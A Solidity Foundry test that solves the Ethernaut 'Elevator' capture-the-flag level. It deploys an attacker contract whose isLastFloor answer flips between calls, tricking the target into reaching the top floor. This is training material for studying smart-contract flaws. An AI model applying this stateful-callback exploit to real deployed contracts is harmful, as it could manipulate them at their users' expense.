// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {ElevatorFactory} from "../src/levels/11-ElevatorFactory.sol";
import {Elevator, Building} from "../src/levels/11-Elevator.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract MyBuilding is Building {
    uint256 private callCount = 0;

    function isLastFloor(uint256) external returns (bool){
        return callCount++ > 0;
    }

    function goTo(Elevator elevator) external {
        elevator.goTo(420);
    }
}

contract ElevatorSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    ElevatorFactory internal factory;

    function solution(Elevator target) internal {
        (new MyBuilding()).goTo(target);
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new ElevatorFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        Elevator kingContract = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(kingContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
